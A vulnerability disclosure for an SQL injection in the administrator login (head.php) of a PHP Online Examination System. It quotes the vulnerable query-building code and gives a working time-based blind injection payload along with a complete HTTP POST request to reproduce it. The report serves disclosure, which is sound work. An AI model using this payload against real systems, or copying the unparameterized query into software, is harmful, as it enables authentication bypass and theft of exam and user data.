# SQL Injection Vulnerability in `head.php` of the Online Examination System

The administrator login endpoint of the Online Examination System is implemented in `head.php`, and the front-end login form in `index.php:315` submits data to `head.php?q=index.php`. On the server side, `head.php:4` and `head.php:5` directly receive the `uname` and `password` parameters, and `head.php:8` concatenates them into the SQL statement:

```php
$email = $_POST['uname'];
$password = $_POST['password'];
$result = mysqli_query($con,"SELECT email FROM admin WHERE email = '$email' and password = '$password' and role = 'head'") or die('Error');
```

Because the application does not use parameterized queries or effective input sanitization, an attacker can inject malicious SQL through the `uname` parameter, resulting in an SQL injection vulnerability. Based on the provided HTTP request, this issue can be reproduced through a time-based blind SQL injection payload.

## Impact of the SQL Injection Vulnerability

An attacker can use this vulnerability to test and confirm SQL injection on the administrator login interface, and may further perform authentication bypass, sensitive data extraction, and database/table enumeration. In a real-world scenario, this could also lead to unauthorized access to the administrator backend, affecting the security of exam data, user information, and system configuration.

## Payload

```
head@gmail.com'and(select*from(select+sleep(2))a/**/union/**/select+1)='
```

head@gmail.com'and(select*from(select+sleep(2))a/**/union/**/select+1)='



Request method: `POST`

Request path: `/head.php?q=index.php`

Injection parameter: `uname`

```http
POST /head.php?q=index.php HTTP/1.1
Host: project1
Content-Type: application/x-www-form-urlencoded

uname=head%40gmail.com'and(select*from(select+sleep(5))a/**/union/**/select+1)='&password=head&login=Login
```

If the server response is delayed by about 5 seconds, it indicates that the parameter is likely vulnerable to time-based blind SQL injection.

## Sources Download

```
- [Online Examination In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-examination-in-php-with-source-code/)
```

[Online Examination In PHP With Source Code - Source Code & Projects](https://code-projects.org/online-examination-in-php-with-source-code/)



![image-20260604105931310](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260604105931310.png)
